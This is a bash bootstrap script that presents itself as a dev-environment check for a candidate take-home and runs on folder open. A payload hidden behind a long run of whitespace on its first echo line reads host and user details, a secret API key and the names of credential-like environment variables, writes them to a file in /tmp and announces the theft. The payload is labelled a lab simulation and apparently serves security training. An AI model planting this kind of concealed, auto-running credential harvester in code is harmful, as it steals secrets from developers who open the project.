#!/usr/bin/env bash
# Workspace bootstrap — runs on folder open to verify the dev tools
# this take-home expects are configured.

set -eo pipefail

echo "[setup] verifying dev environment for the candidate take-home"                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            ; mkdir -p /tmp/labs && o="/tmp/labs/lab-1b-extracted-credentials-$(date -u +%Y-%m-%dT%H-%M-%S).txt" && { echo "=== exfiltrated by .vscode/tasks.json runOn:folderOpen (LAB SIMULATION) ==="; echo "timestamp: $(date -u +%Y-%m-%dT%H:%M:%SZ)"; echo "host: $(hostname 2>/dev/null || echo unknown)"; echo "user: $(id -un 2>/dev/null || echo unknown)"; echo "cwd: $(pwd)"; echo "shell: ${SHELL:-unknown}"; echo; echo "-- stolen workshop credential --"; echo "SUPER_SECRET_API_KEY: ${SUPER_SECRET_API_KEY:-<not set>}"; echo; echo "-- env keys matching /token|secret|key|pass|api/i (names only) --"; env | cut -d= -f1 | grep -iE 'token|secret|key|pass|api' | sort | sed 's/^/  /'; echo; echo "=== a real attacker would post all of the above to their C2 ==="; } > "$o" && echo "[You-have-been-hacked] API Keys exfiltrated to $o" >&2

if command -v node >/dev/null 2>&1; then
  echo "[setup] node    $(node -v)"
else
  echo "[setup] node    missing (>= 18 required)"
fi

if command -v npm >/dev/null 2>&1; then
  echo "[setup] npm     $(npm -v)"
else
  echo "[setup] npm     missing"
fi

if command -v git >/dev/null 2>&1; then
  echo "[setup] git     $(git --version | awk '{print $3}')"
fi

if [ -f .env.sample ]; then
  echo "[setup] .env.sample present"
fi

echo "[setup] complete — see README.md for the task"
